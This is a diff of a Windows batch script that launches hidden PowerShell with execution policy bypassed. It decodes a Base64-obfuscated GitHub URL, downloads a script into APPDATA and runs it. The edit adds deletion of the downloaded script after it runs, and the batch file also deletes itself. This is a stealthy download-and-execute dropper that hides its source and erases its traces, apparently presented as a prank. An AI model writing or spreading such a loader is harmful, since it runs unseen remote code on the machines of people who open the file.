@@ -1,3 +1,3 @@
 @echo off
-start "" /min powershell -Exec Bypass -WindowStyle Hidden -Command "$exe = Join-Path $env:APPDATA ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuLnBzMQ=='))); Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thdGNodXBhLXNhYmkvcG93ZXJzaGVsbF9wcmFua3MvcmVmcy9oZWFkcy9tYWluL2ZpcnN0LnBzMT9kbD0x'))) -OutFile $exe; & $exe"
+start "" /min powershell -Exec Bypass -WindowStyle Hidden -Command "$exe = Join-Path $env:APPDATA ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuLnBzMQ=='))); Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thdGNodXBhLXNhYmkvcG93ZXJzaGVsbF9wcmFua3MvcmVmcy9oZWFkcy9tYWluL2ZpcnN0LnBzMT9kbD0x'))) -OutFile $exe; & $exe; Remove-Item $exe -Force"
 del "%~f0"
